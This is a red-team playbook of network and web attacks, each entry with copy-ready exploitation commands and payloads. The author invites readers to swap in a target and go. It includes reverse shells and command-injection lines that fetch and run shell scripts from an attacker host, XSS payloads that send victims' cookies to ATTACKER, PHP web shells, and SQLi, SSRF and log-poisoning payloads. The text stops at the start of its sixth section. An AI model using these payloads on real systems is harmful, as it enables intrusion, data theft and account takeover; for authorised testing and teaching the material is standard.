# 20 - Attacks & Techniques (Red Team Playbook)

> **Author:** Zeeshan  
> **GitHub:** https://github.com/mzeeshanzafar28  
> **LinkedIn:** https://www.linkedin.com/in/mzeeshanzafar28

A phase-ordered reference of red-team attacks and techniques. Every entry explains **what it is → how it works → the goal → how to exploit it** with real examples and tool syntax, so you can copy, swap in your target, and go.

---

## Table of Contents

1. [Reconnaissance & Scanning](#1-reconnaissance--scanning)
2. [Network Attacks](#2-network-attacks)
3. [Web — Injection Attacks](#3-web--injection-attacks)
4. [Web — File & Path Attacks](#4-web--file--path-attacks)
5. [Web — Session, Auth & Request Attacks](#5-web--session-auth--request-attacks)
6. [Credential Attacks](#6-credential-attacks)
7. [Active Directory Attacks](#7-active-directory-attacks)
8. [Linux Privilege Escalation](#8-linux-privilege-escalation)
9. [Windows Privilege Escalation](#9-windows-privilege-escalation)
10. [Binary Exploitation](#10-binary-exploitation)
11. [Shells, Lateral Movement & Pivoting](#11-shells-lateral-movement--pivoting)
12. [Persistence & Post-Exploitation](#12-persistence--post-exploitation)
13. [Cloud Attacks](#13-cloud-attacks)

---

## 1. Reconnaissance & Scanning

### Port Scanning
- **What it is:** Discovering open TCP/UDP ports on a target to map its attack surface.
- **How it works:** Sends crafted packets and interprets responses (SYN-ACK = open, RST = closed, no reply = filtered).
- **Goal:** Enumerate live services before attacking them.
- **Exploitation:**
  ```bash
  nmap -sS -sV -p- --min-rate 1000 TARGET_IP   # SYN scan, all ports, version detection
  nmap -sC -sV -p 21,22,80,443,445 TARGET_IP   # default scripts on common ports
  nmap -sU --top-ports 100 TARGET_IP           # UDP scan
  ```
- **Tools:** `nmap`, `masscan`, `rustscan`

### Service Enumeration
- **What it is:** Interrogating a discovered open service to learn its software, version, and configuration.
- **How it works:** Sends protocol-specific probes (banner reads, handshakes, queries).
- **Goal:** Identify the exact software/version to match known exploits or misconfigurations.
- **Exploitation:**
  ```bash
  nmap -sV -sC -p 445 TARGET_IP                # SMB version + scripts
  nmap --script smb-enum-shares -p 445 TARGET_IP
  ```
- **Tools:** `nmap -sV`, `enum4linux`, `snmpwalk`

### Banner Grabbing
- **What it is:** Reading the greeting string a service returns upon connection, which often leaks software/version.
- **How it works:** Connects and reads the initial bytes the server sends.
- **Goal:** Fingerprint software/version for exploit matching.
- **Exploitation:**
  ```bash
  nc -nv TARGET_IP 21        # FTP banner
  nc -nv TARGET_IP 22        # SSH version banner
  curl -I http://TARGET_IP   # HTTP Server header
  telnet TARGET_IP 25        # SMTP banner
  ```
- **Tools:** `netcat`, `telnet`, `curl`, `nmap -sV`

### Network Sniffing
- **What it is:** Capturing live traffic on a network segment for analysis or credential harvesting.
- **How it works:** Puts the interface in promiscuous mode (or uses ARP poisoning) to observe frames.
- **Goal:** Recover credentials, sessions, or map hosts/protocols in cleartext.
- **Exploitation:**
  ```bash
  tcpdump -i eth0 -w capture.pcap
  tcpdump -i eth0 'port 21 or port 23' -A     # cleartext creds (FTP/Telnet)
  tshark -i eth0 -Y "http.request.method == POST"
  ```
- **Tools:** `tcpdump`, `wireshark`, `tshark`

### Packet Capture
- **What it is:** Saving raw frames/packets to a file (`.pcap`) for offline analysis.
- **How it works:** Libpcap-based capture; later filtered/decoded in Wireshark.
- **Goal:** Evidence collection, protocol decoding (e.g. Modbus in SCADA), and handshake capture.
- **Exploitation:**
  ```bash
  sudo tcpdump -i eth0 -w evidence.pcap
  sudo wireshark evidence.pcap
  ```
- **Tools:** `tcpdump`, `wireshark`, `dumpcap`

### Vulnerability Scanning
- **What it is:** Automated probing for known CVEs and misconfigurations.
- **How it works:** Sends thousands of checks comparing service fingerprints to a vulnerability database.
- **Goal:** Prioritize exploitable targets quickly (careful in OT/SCADA environments — avoid aggressive scans).
- **Exploitation:**
  ```bash
  nmap --script vuln -p 445 TARGET_IP          # targeted vuln checks
  # OpenVAS / Nessus for full assessments (use -T2 in OT networks)
  ```
- **Tools:** `nmap --script vuln`, `OpenVAS`, `Nessus`

### Information Disclosure
- **What it is:** Unintentional leakage of sensitive data (source code, keys, internal paths, version info).
- **How it works:** Poor config, debug pages, verbose errors, exposed files (`.git`, `.env`, backups).
- **Goal:** Harvest credentials/keys or map the app internals for further attacks.
- **Exploitation:**
  ```bash
  curl http://TARGET/.git/config
  curl http://TARGET/.env
  ffuf -u http://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt
  ```
- **Tools:** `ffuf`, `gobuster`, `curl`, `dirsearch`

---

## 2. Network Attacks

### ARP Spoofing
- **What it is:** Poisoning a victim's ARP cache so their traffic flows through the attacker.
- **How it works:** Sends forged ARP replies mapping the gateway's IP to the attacker's MAC.
- **Goal:** Become the man-in-the-middle to sniff, modify, or relay traffic.
- **Exploitation:**
  ```bash
  echo 1 > /proc/sys/net/ipv4/ip_forward     # enable forwarding
  arpspoof -i eth0 -t VICTIM_IP GATEWAY_IP
  arpspoof -i eth0 -t GATEWAY_IP VICTIM_IP
  ```
- **Tools:** `arpspoof`, `ettercap`, `bettercap`

### Man-in-the-Middle (MITM)
- **What it is:** Intercepting and optionally modifying traffic between two parties.
- **How it works:** Usually via ARP spoofing, rogue DHCP, or proxy interception.
- **Goal:** Sniff, relay, or inject traffic (capture credentials, downgrade TLS).
- **Exploitation:**
  ```bash
  bettercap -iface eth0
  # > net.probe on; net.sniff on; arp.spoof on
  ```
- **Tools:** `bettercap`, `ettercap`, `mitmproxy`

### DNS Spoofing
- **What it is:** Answering DNS queries with a malicious IP to redirect victims.
- **How it works:** Attacker races or pre-empts the real resolver, or poisons its cache.
- **Goal:** Redirect victims to attacker-controlled hosts (phishing, credential capture).
- **Exploitation:**
  ```bash
  # ettercap plugin or dnschef
  dnschef --fakeip ATTACKER_IP --fakedomains bank.example.com
  ```
- **Tools:** `ettercap`, `dnschef`, `dnsspoof`

### SSL Stripping
- **What it is:** Downgrading HTTPS connections to HTTP transparently via MITM.
- **How it works:** Attacker intercepts the client's HTTP request and keeps the HTTPS session with the server, relaying plaintext.
- **Goal:** Capture credentials sent over the downgraded plaintext channel.
- **Exploitation:**
  ```bash
  bettercap -iface eth0
  # > set http.proxy.sslstrip true; http.proxy on; arp.spoof on
  ```
- **Tools:** `bettercap` (sslstrip), `sslstrip`

### LLMNR/NBT-NS Poisoning
- **What it is:** Answering multicast name-resolution queries (LLMNR/NBT-NS) when DNS fails, to steal NetNTLM hashes.
- **How it works:** When a Windows host can't resolve a name via DNS, it broadcasts LLMNR/NBT-NS; the attacker responds "I'm that host" and captures the authentication attempt.
- **Goal:** Harvest NetNTLMv2 hashes for offline cracking or relaying.
- **Exploitation:**
  ```bash
  sudo responder -I eth0 -dwv
  # then crack captured hashes
  hashcat -m 5600 hashes.txt rockyou.txt
  ```
- **Tools:** `Responder`, `Inveigh`

### SMB Relay Attack
- **What it is:** Forwarding captured NetNTLM authentication to another host to authenticate as the victim.
- **How it works:** The attacker relays the challenge-response to a target where the victim has access (SMB signing disabled), gaining an authenticated session.
- **Goal:** Execute code/commands on the relay target without cracking the hash.
- **Exploitation:**
  ```bash
  # Disable SMB/HTTP in Responder, run ntlmrelayx
  sudo sed -i 's/SMB = On/SMB = Off/' /etc/responder/Responder.conf
  sudo responder -I eth0 -dwv &
  sudo ntlmrelayx.py -tf targets.txt -smb2support -i
  ```
- **Tools:** `ntlmrelayx.py` (Impacket), `Responder`
## 3. Web — Injection Attacks

### SQL Injection (SQLi)
- **What it is:** Injecting SQL into a query by manipulating user input that's concatenated unsafely into the statement.
- **How it works:** Input like `' OR 1=1--` alters the query's logic, letting the attacker read/modify/delete database data.
- **Goal:** Extract data, bypass authentication, or execute commands on the DB host.
- **Exploitation:**
  ```sql
  ' OR '1'='1
  ' OR '1'='1'--
  admin' --
  ```
  ```bash
  sqlmap -u "http://TARGET/page?id=1" --dbs
  sqlmap -u "http://TARGET/page?id=1" -D dbname --tables --dump
  ```
- **Tools:** `sqlmap`, `Burp Suite`, manual payloads

### Union-based SQL Injection
- **What it is:** Using the SQL `UNION` operator to append a second query and read data directly into the response.
- **How it works:** The attacker matches the column count/types of the original query and injects `UNION SELECT` to return arbitrary data.
- **Goal:** Dump database contents through the visible result set.
- **Exploitation:**
  ```sql
  1' UNION SELECT 1,2,3--              # find column count
  1' UNION SELECT username,password,3 FROM users--
  ```
  ```bash
  sqlmap -u "http://TARGET/page?id=1" --technique=U --dump
  ```
- **Tools:** `sqlmap`, Burp

### Error-based SQL Injection
- **What it is:** Triggering database errors that reveal data within the error message.
- **How it works:** Payloads force the DB to include queried data in an error string (e.g., `extractvalue`, `convert` type mismatch).
- **Goal:** Extract data via error output when there's no direct visible column.
- **Exploitation:**
  ```sql
  1' AND extractvalue(1,concat(0x7e,(SELECT version())))--     # MySQL
  1' AND 1=convert(int,(SELECT @@version))--                   # MSSQL
  ```
  ```bash
  sqlmap -u "http://TARGET/page?id=1" --technique=E
  ```
- **Tools:** `sqlmap`

### Boolean-based Blind SQLi
- **What it is:** Inferring data by observing true/false differences in responses.
- **How it works:** Payloads ask yes/no questions (e.g., "is the first character of the password 'a'?") and the response differs (content length, status).
- **Goal:** Extract data bit by bit when nothing is printed directly.
- **Exploitation:**
  ```sql
  1' AND 1=1--     # true  (normal response)
  1' AND 1=2--     # false (different response)
  1' AND substring((SELECT password FROM users LIMIT 1),1,1)='a'--
  ```
  ```bash
  sqlmap -u "http://TARGET/page?id=1" --technique=B
  ```
- **Tools:** `sqlmap`

### Time-based Blind SQLi
- **What it is:** Inferring data via response delays (sleep on condition true).
- **How it works:** Payloads cause the DB to `SLEEP()`/`WAITFOR DELAY` when a condition is true; the delay is the signal.
- **Goal:** Extract data when there's no visible output AND no true/false content difference.
- **Exploitation:**
  ```sql
  1' AND SLEEP(5)--                          # MySQL
  1' AND IF(1=1,SLEEP(5),0)--                # conditional
  1'; WAITFOR DELAY '0:0:5'--                # MSSQL
  ```
  ```bash
  sqlmap -u "http://TARGET/page?id=1" --technique=T
  ```
- **Tools:** `sqlmap`

### Blind SQL Injection (general)
- **What it is:** Any SQLi where the query result isn't directly displayed — data must be inferred (boolean or time-based).
- **How it works:** See the two blind sub-types above.
- **Goal:** Extract data through side-channels (timing, response length, status codes).
- **Tools:** `sqlmap` (auto-detects `--technique=B,T`)

### XSS (Cross-Site Scripting)
- **What it is:** Injecting client-side JavaScript into a page that runs in another user's browser.
- **How it works:** Unsanitized user input is rendered as HTML/JS; the browser executes it in the victim's session context.
- **Goal:** Steal cookies/tokens, deface, redirect, or perform actions as the victim.
- **Exploitation:**
  ```html
  <script>alert(document.cookie)</script>
  <script>fetch('//ATTACKER/?c='+document.cookie)</script>
  <img src=x onerror=alert(1)>
  ```
- **Tools:** Burp, `XSSer`, manual payloads

### Reflected XSS
- **What it is:** XSS where the payload is echoed back immediately from the request (e.g., search term, error message).
- **How it works:** The payload is part of the request and reflected in the response; the victim clicks a crafted link.
- **Goal:** Execute JS in the victim's browser to steal session/credentials.
- **Exploitation:**
  ```
  http://TARGET/search?q=<script>alert(document.cookie)</script>
  ```
- **Tools:** Burp, manual

### Stored XSS
- **What it is:** XSS persisted in the app (database, comment, profile) and served to every visitor.
- **How it works:** The payload is stored server-side and rendered later for all users — highest impact.
- **Goal:** Persistent cookie/credential theft, account takeover, mass defacement.
- **Exploitation:**
  ```html
  <!-- submitted as a comment -->
  <script>new Image().src='//ATTACKER/steal?c='+document.cookie</script>
  ```
- **Tools:** Burp, `XSSer`

### DOM-based XSS
- **What it is:** XSS arising from unsafe client-side JS manipulating `document`/`location` without sanitization.
- **How it works:** The payload never reaches the server; it's processed by vulnerable JavaScript (e.g., `innerHTML`, `eval`, `location.hash`).
- **Goal:** Execute JS purely client-side, often bypassing server-side filters.
- **Exploitation:**
  ```javascript
  // vulnerable: document.write(location.hash)
  http://TARGET/#<img src=x onerror=alert(1)>
  ```
- **Tools:** Browser DevTools, Burp, `DOM Invader` (Burp extension)

### CSRF (Cross-Site Request Forgery)
- **What it is:** Forcing an authenticated victim's browser to send an unintended state-changing request.
- **How it works:** A malicious page auto-submits a form/request to a site where the victim is logged in; the browser attaches the session cookie.
- **Goal:** Perform actions (password change, fund transfer) as the victim without their knowledge.
- **Exploitation:**
  ```html
  <form action="http://TARGET/change-password" method="POST">
    <input type="hidden" name="new_password" value="hacked123">
    <input type="submit">
  </form>
  <script>document.forms[0].submit()</script>
  ```
- **Tools:** Burp (CSRF PoC generator), manual

### Command Injection
- **What it is:** Injecting OS commands into an input that's passed to a system shell.
- **How it works:** Unsanitized input is concatenated into `system()`, `exec()`, or backticks; shell metacharacters (`;`, `&&`, `|`, `$()`) break out.
- **Goal:** Execute arbitrary OS commands on the server (RCE).
- **Exploitation:**
  ```
  http://TARGET/ping?host=127.0.0.1;id
  http://TARGET/ping?host=127.0.0.1&&whoami
  http://TARGET/ping?host=$(curl ATTACKER/shell.sh|sh)
  ```
- **Tools:** Burp, `commix`

### OS Command Injection
- **What it is:** Synonym for Command Injection — executing operating-system commands through an app vulnerability.
- **How it works:** Same as command injection (shell metacharacter breakout).
- **Goal:** Full remote code execution.
- **Exploitation:**
  ```bash
  commix -u "http://TARGET/ping?host=127.0.0.1"
  ```

### Code Injection
- **What it is:** Injecting source code (PHP, Python, etc.) that the application executes directly.
- **How it works:** User input is passed to an `eval()`-style sink; code is interpreted in the app's language.
- **Goal:** Execute arbitrary code in the application runtime.
- **Exploitation:**
  ```php
  <!-- PHP eval injection -->
  http://TARGET/page.php?param=phpinfo();
  http://TARGET/page.php?param=system('id');
  ```
- **Tools:** Burp, manual

### SSTI (Server-Side Template Injection)
- **What it is:** Injecting template-engine syntax into a template, causing arbitrary code execution server-side.
- **How it works:** User input is rendered by a template engine (Jinja2, Twig, Freemarker); injected directives execute code/objects.
- **Goal:** Read files, execute commands, achieve RCE.
- **Exploitation:**
  ```
  {{7*7}}                       # test: 49 confirms SSTI
  {{config}}                    # Jinja2 config leak
  {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
  ```
- **Tools:** Burp, `tplmap`, payload cheat sheets

### NoSQL Injection
- **What it is:** Injecting operators into NoSQL queries (MongoDB `$gt`, `$ne`, `$where`).
- **How it works:** JSON/query inputs are parsed as operators, altering query logic (auth bypass or data extraction).
- **Goal:** Bypass auth or dump NoSQL data.
- **Exploitation:**
  ```json
  {"username": {"$ne": null}, "password": {"$ne": null}}
  {"username": "admin", "password": {"$regex": "^a"}}
  ```
- **Tools:** Burp, `NoSQLMap`

### LDAP Injection
- **What it is:** Injecting LDAP filter syntax into queries to alter directory lookups.
- **How it works:** Input like `*)(uid=*))(|(uid=*` breaks out of the filter and returns extra/matching records.
- **Goal:** Bypass LDAP auth or enumerate directory entries.
- **Exploitation:**
  ```
  username=*)(uid=*))(|(uid=*&password=x
  username=admin)(&)(
  ```
- **Tools:** Burp, manual

### XPath Injection
- **What it is:** Injecting XPath expressions into XML document queries.
- **How it works:** Similar to SQLi but against XPath queries over XML data; `' or '1'='1` bypasses logic.
- **Goal:** Bypass auth or extract XML data.
- **Exploitation:**
  ```
  username=' or '1'='1' or 'a'='a
  username=' or 1=1] | //user[1] |
  ```
- **Tools:** Burp, manual

### XXE (XML External Entity)
- **What it is:** Exploiting XML parsers that process external entities to read files, SSRF, or DoS.
- **How it works:** A crafted `<!DOCTYPE>` with an external entity (`SYSTEM "file:///etc/passwd"`) is expanded by the parser.
- **Goal:** Read local files, perform SSRF, or trigger DoS (billion laughs).
- **Exploitation:**
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <foo>&xxe;</foo>
  ```
- **Tools:** Burp, manual

### SSRF (Server-Side Request Forgery)
- **What it is:** Forcing the server to make requests to arbitrary (often internal) URLs.
- **How it works:** An app fetches a user-supplied URL; the attacker points it at internal services or cloud metadata.
- **Goal:** Reach internal services, read cloud metadata, port-scan internally.
- **Exploitation:**
  ```
  http://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
  http://TARGET/fetch?url=http://127.0.0.1:8080/admin
  ```
- **Tools:** Burp Collaborator, `ssrfmap`

### Remote Code Execution (RCE)
- **What it is:** Executing arbitrary code/commands on a target system.
- **How it works:** Via any code/command injection, deserialization, upload of a web shell, or known CVE.
- **Goal:** Obtain a shell / full control of the target.
- **Exploitation:**
  ```bash
  # generic reverse shell
  nc -e /bin/sh ATTACKER_IP 4444
  ```
- **Tools:** `msfvenom`, shells below (see §12)

### Deserialization / Insecure Deserialization
- **What it is:** Exploiting apps that unserialize untrusted data to achieve code execution.
- **How it works:** A crafted serialized object (Java, PHP, Python pickle) triggers magic methods/gadgets that run code on `unserialize()`.
- **Goal:** RCE, auth bypass, or data tampering.
- **Exploitation:**
  ```bash
  # generate gadget payload with ysoserial
  java -jar ysoserial.jar CommonsCollections4 'id' > payload.ser
  curl -X POST --data-binary @payload.ser http://TARGET/deserialize
  ```
- **Tools:** `ysoserial`, `ysoserial.net`, Burp

### Arbitrary File Read
- **What it is:** Reading files outside the intended scope via traversal or vulnerable functions.
- **How it works:** Path traversal (`../../`), XXE, SSRF, or exposed endpoints return file contents.
- **Goal:** Extract configs, source, credentials (e.g., `/etc/passwd`, `appsettings.json`).
- **Exploitation:**
  ```
  http://TARGET/download?file=../../../../etc/passwd
  ```
- **Tools:** Burp, curl

### Arbitrary File Write
- **What it is:** Writing files to arbitrary locations on the server.
- **How it works:** Upload, path traversal in filename, or deserialization lets attacker place files (e.g., into a writable web dir or `authorized_keys`).
- **Goal:** Write a web shell, overwrite config, or add an SSH key.
- **Exploitation:**
  ```bash
  # upload a .php shell, or overwrite SSH authorized_keys
  ```
- **Tools:** Burp, curl
## 4. Web — File & Path Attacks

### Path Traversal / Directory Traversal
- **What it is:** Reading files outside the web root by moving up directories in a path parameter.
- **How it works:** Input like `../../../../etc/passwd` is concatenated into a file path; `..` climbs the tree, escaping the intended directory.
- **Goal:** Read sensitive files (passwd, configs, keys).
- **Exploitation:**
  ```
  http://TARGET/download?file=../../../../etc/passwd
  http://TARGET/download?file=....//....//....//etc/passwd   # filter bypass
  http://TARGET/download?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd # URL-encoded
  ```
- **Tools:** Burp, curl, `dotdotpwn`

### LFI (Local File Inclusion)
- **What it is:** Including a local file from the server into the page (PHP `include`/`require`).
- **How it works:** The `include` path is user-controlled; the attacker includes local files (or injects code via wrappers/logs).
- **Goal:** Read files, or escalate to RCE via wrappers or log poisoning.
- **Exploitation:**
  ```
  http://TARGET/?page=../../../../etc/passwd
  http://TARGET/?page=php://filter/convert.base64-encode/resource=config.php
  http://TARGET/?page=expect://id                     # if expect wrapper enabled
  http://TARGET/?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
  ```
- **Tools:** Burp, `LFISuite`

### RFI (Remote File Inclusion)
- **What it is:** Including a remote file (attacker-hosted) into the page, leading to RCE.
- **How it works:** If `allow_url_include` is on, the `include` can fetch a remote URL and execute it as PHP.
- **Goal:** Execute attacker code directly (RCE).
- **Exploitation:**
  ```
  # attacker serves shell.txt: <?php system($_GET['c']); ?>
  http://TARGET/?page=http://ATTACKER_IP/shell.txt&c=id
  ```
- **Tools:** Burp, Python HTTP server

### Log Poisoning
- **What it is:** Injecting PHP/JS code into log files (via User-Agent, referrer, or request path) then including them via LFI.
- **How it works:** The attacker puts a web-shell snippet in a header; the server logs it; LFI then includes the log file, executing the code.
- **Goal:** Turn LFI into RCE.
- **Exploitation:**
  ```bash
  # inject code into User-Agent
  curl -A "<?php system(\$_GET['c']); ?>" http://TARGET/
  # then include the log
  http://TARGET/?page=/var/log/apache2/access.log&c=id
  ```
- **Tools:** Burp, curl

### File Upload Vulnerability
- **What it is:** An upload function that doesn't validate file type/content, allowing malicious files.
- **How it works:** The attacker uploads a `.php`/`.jsp`/`.asp` file (or bypasses filters via double extension, MIME spoofing) and requests it.
- **Goal:** Place a web shell → RCE.
- **Exploitation:**
  ```bash
  # shell.php: <?php system($_GET['c']); ?>
  # bypass examples: shell.php.jpg, shell.jpg.php, shell.pHp, change Content-Type to image/jpeg
  curl -F "file=@shell.php" http://TARGET/upload
  ```
- **Tools:** Burp, curl, `weevely`

### Unrestricted File Upload
- **What it is:** An upload endpoint with no (or easily bypassed) restrictions — a direct path to a shell.
- **How it works:** No extension/type/size checks; any executable file is accepted.
- **Goal:** Upload and execute a web shell.
- **Exploitation:**
  ```bash
  # generate an obfuscated PHP shell
  weevely generate PASSWORD shell.php
  weevely http://TARGET/uploads/shell.php PASSWORD
  ```
- **Tools:** `weevely`, Burp

### Web Shell Upload
- **What it is:** Uploading a small script that lets the attacker run OS commands over HTTP.
- **How it works:** A one-liner shell (`<?php system($_GET['c']); ?>`) is uploaded and accessed; commands pass via query param.
- **Goal:** Interactive command execution / full RCE.
- **Exploitation:**
  ```php
  <?php echo shell_exec($_GET['c']); ?>
  ```
  ```
  http://TARGET/uploads/shell.php?c=whoami
  http://TARGET/uploads/shell.php?c=curl%20ATTACKER/shell.sh%20|%20bash
  ```
- **Tools:** `weevely`, `msfvenom` (web payloads), Burp

---

## 5. Web — Session, Auth & Request Attacks

### Authentication Bypass
- **What it is:** Circumventing login without valid credentials.
- **How it works:** SQLi (`' OR 1=1--`), default creds, logic flaws, or bypassable checks.
- **Goal:** Gain access as a user/admin without a password.
- **Exploitation:**
  ```
  username: admin' OR '1'='1'--
  password: anything
  ```
- **Tools:** Burp, sqlmap

### Broken Authentication
- **What it is:** Flawed implementation of login/session (weak reset, predictable tokens, no rate-limit, no MFA).
- **How it works:** Design flaws let attackers guess, reset, or reuse credentials/sessions.
- **Goal:** Bypass or defeat the authentication mechanism.
- **Exploitation:**
  ```bash
  # predictable password reset token, or brute-force with no lockout
  hydra -l admin -P rockyou.txt TARGET http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
  ```
- **Tools:** Burp, `hydra`

### Session Fixation
- **What it is:** Forcing a victim to use a session ID chosen by the attacker.
- **How it works:** Attacker obtains/creates a valid session ID, tricks the victim into authenticating with it, then reuses it.
- **Goal:** Hijack the victim's authenticated session.
- **Exploitation:**
  ```
  http://TARGET/login?sessionid=ATTACKER_CHOSEN_ID   # victim logs in with this SID
  # attacker then uses the same SID and is authenticated
  ```
- **Tools:** Burp

### Session Hijacking
- **What it is:** Stealing a victim's session cookie/token to impersonate them.
- **How it works:** XSS, sniffing, or prediction captures the session ID; the attacker replays it.
- **Goal:** Take over the victim's account.
- **Exploitation:**
  ```bash
  # after XSS steals cookie:
  curl -H "Cookie: session=VICTIM_COOKIE" http://TARGET/account
  ```
- **Tools:** Burp, XSS payloads

### IDOR (Insecure Direct Object Reference)
- **What it is:** Accessing objects (records, files) by a direct reference (ID) without authorization checks.
- **How it works:** Changing `?id=123` to `?id=124` returns another user's data — no access control.
- **Goal:** Access unauthorized data or actions.
- **Exploitation:**
  ```
  http://TARGET/account?id=100   # yours
  http://TARGET/account?id=101   # someone else's (no authz check)
  http://TARGET/invoice/download/1001.pdf
  ```
- **Tools:** Burp, `autorize` (Burp ext)

### Vertical Privilege Escalation
- **What it is:** Gaining a higher privilege level (user → admin) in an app.
- **How it works:** Broken access control, hidden admin endpoints, or role parameter tampering.
- **Goal:** Reach admin functionality.
- **Exploitation:**
  ```
  http://TARGET/user → http://TARGET/admin      # direct admin access
  POST role=user  →  POST role=admin             # parameter tampering
  ```
- **Tools:** Burp

### Horizontal Privilege Escalation
- **What it is:** Accessing another user's data at the same privilege level (see IDOR).
- **How it works:** Changing an ID/reference to view peer data.
- **Goal:** Read/modify sibling accounts' data.
- **Exploitation:**
  ```
  http://TARGET/profile?user_id=1001  → 1002, 1003...
  ```
- **Tools:** Burp

### JWT Attack / Token Manipulation
- **What it is:** Exploiting JSON Web Token weaknesses (none algorithm, weak secret, `kid` injection).
- **How it works:** Tokens are signed but often misconfigured — `alg:none`, weak HMAC secret, or `kid` path traversal.
- **Goal:** Forge a valid token to impersonate users or escalate privileges.
- **Exploitation:**
  ```bash
  # 1. change header to {"alg":"none"} and drop signature
  # 2. crack weak HMAC secret
  hashcat -m 16500 jwt.txt rockyou.txt
  # 3. forge admin token with recovered secret
  # use https://jwt.io or python jwt
  ```
  ```python
  import jwt
  token = jwt.encode({"user":"admin","role":"admin"}, "SECRET", algorithm="HS256")
  ```
- **Tools:** `jwt_tool`, `hashcat -m 16500`, `jwt.io`

### API Abuse
- **What it is:** Exploiting API endpoints (missing auth, broken object-level auth, mass assignment).
- **How it works:** APIs often expose more than the UI; endpoints lack per-object authorization or input validation.
- **Goal:** Access data/actions not exposed in the frontend.
- **Exploitation:**
  ```bash
  curl http://TARGET/api/v1/users           # list all users
  curl http://TARGET/api/v1/users/1         # BOLA
  curl -X PUT http://TARGET/api/v1/users/1 -d '{"role":"admin"}'  # mass assignment
  ```
- **Tools:** Burp, `ffuf`, Postman

### Mass Assignment
- **What it is:** Submitting extra object fields that the server binds, letting you set privileged properties.
- **How it works:** Frameworks auto-bind request params to model fields (e.g., `isAdmin=true`).
- **Goal:** Elevate privileges or bypass validations.
- **Exploitation:**
  ```json
  {"username":"attacker", "password":"x", "role":"admin", "isAdmin": true}
  ```
- **Tools:** Burp

### Business Logic Flaw
- **What it is:** Abusing legitimate application flows in unintended ways (negative prices, skipping steps, reuse of coupons).
- **How it works:** The app trusts workflow state; the attacker reorders/skips/bypasses steps.
- **Goal:** Financial gain or unauthorized actions.
- **Exploitation:**
  ```
  # negative quantity, bypass payment step, reuse discount code, skip 2FA step
  ```
- **Tools:** Burp (manual workflow analysis)

### Open Redirect
- **What it is:** A redirect endpoint that forwards to an arbitrary URL.
- **How it works:** `?redirect=`/`?next=` parameters are reflected into the `Location` header without validation.
- **Goal:** Phishing (lend legitimacy to a malicious URL) or token leakage.
- **Exploitation:**
  ```
  http://TARGET/login?next=https://evil.com
  http://TARGET/redirect?url=//evil.com
  ```
- **Tools:** Burp

### Clickjacking
- **What it is:** Tricking a user into clicking invisible UI elements layered over a legitimate page.
- **How it works:** The target page is embedded in a transparent iframe over a decoy; clicks hit the hidden elements.
- **Goal:** Perform unintended actions (enable mic, transfer funds, post).
- **Exploitation:**
  ```html
  <iframe src="http://TARGET/settings" style="opacity:0.01; position:absolute; top:0; left:0"></iframe>
  <button>Click to win a prize</button>
  ```
- **Tools:** Manual, `clickjacking` PoC generators

### Host Header Injection
- **What it is:** Supplying a malicious `Host` header that the app uses to build links, reset emails, or route.
- **How it works:** Apps trusting the `Host` header generate attacker-controlled URLs (password reset, cache keys).
- **Goal:** Password reset poisoning, cache poisoning, or SSRF-ish routing.
- **Exploitation:**
  ```
  POST /reset HTTP/1.1
  Host: evil.com
  email=victim@target.com
  # reset link is sent pointing to evil.com
  ```
- **Tools:** Burp

### HTTP Request Smuggling
- **What it is:** Desynchronizing front-end/back-end servers by exploiting conflicting `Content-Length` vs `Transfer-Encoding` headers.
- **How it works:** Different servers parse request boundaries differently, letting an attacker "smuggle" a second request inside another user's connection.
- **Goal:** Bypass WAF, hijack sessions, poison caches.
- **Exploitation:**
  ```http
  POST / HTTP/1.1
  Host: TARGET
  Content-Length: 6
  Transfer-Encoding: chunked

  0

  GPOST /admin HTTP/1.1
  ...
  ```
- **Tools:** Burp (HTTP Request Smuggler), `smuggler`

### Cache Poisoning
- **What it is:** Storing a malicious response in a shared cache so it's served to other users.
- **How it works:** Attacker crafts a request with an unkeyed header (e.g., `X-Forwarded-Host`) that changes the cached response.
- **Goal:** Serve malicious content (XSS payload) to all cache users.
- **Exploitation:**
  ```
  GET / HTTP/1.1
  Host: TARGET
  X-Forwarded-Host: evil.com
  # if XFH is reflected in a cached <script src=...>, it poisons the cache
  ```
- **Tools:** Burp, `param-miner`

### CORS Misconfiguration
- **What it is:** Overly permissive Cross-Origin Resource Sharing (reflecting arbitrary origins, or trusting `null`).
- **How it works:** The server returns `Access-Control-Allow-Origin: <attacker-origin>` with credentials, letting attacker JS read responses.
- **Goal:** Steal sensitive data from the victim's browser.
- **Exploitation:**
  ```bash
  curl -H "Origin: https://evil.com" -I http://TARGET/api/me
  # vulnerable if: Access-Control-Allow-Origin: https://evil.com + Allow-Credentials: true
  ```
- **Tools:** Burp, curl

### Subdomain Takeover
- **What it is:** Claiming a subdomain whose DNS points to a decommissioned third-party service (S3, GitHub Pages, Heroku).
- **How it works:** A dangling CNAME to an unclaimed service lets the attacker register that service and serve content on the subdomain.
- **Goal:** Host phishing, cookie theft, or defacement on a trusted subdomain.
- **Exploitation:**
  ```bash
  # enumerate then check for dangling CNAMEs
  subfinder -d TARGET.com | httpx -silent
  # check CNAME: dig sub.TARGET.com
  # if it points to *.s3.amazonaws.com (unclaimed) → register that bucket
  ```
- **Tools:** `subfinder`, `dig`, `can-i-take-over-xyz`

### Exposed Admin Panels
- **What it is:** Admin interfaces reachable without (or with weak) authentication.
- **How it works:** Default paths (`/admin`, `/phpmyadmin`, `/jenkins`) are exposed with default/blank creds.
- **Goal:** Direct administrative access.
- **Exploitation:**
  ```bash
  ffuf -u http://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .php,.html
  # try /admin, /administrator, /phpmyadmin, /manager/html, /console
  ```
- **Tools:** `ffuf`, `gobuster`

### Default Credentials
- **What it is:** Devices/apps left with manufacturer default usernames/passwords.
- **How it works:** `admin:admin`, `root:toor`, `admin:password` still work because they were never changed.
- **Goal:** Instant access to admin consoles, routers, databases, IoT.
- **Exploitation:**
  ```bash
  hydra -C /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt TARGET -s 80 http-get /
  ```
- **Tools:** `hydra`, seclists default creds, `nmap --script http-default-accounts`
## 6. Credential Attacks

### Password Brute Force
- **What it is:** Trying every possible combination of characters until the password is found.
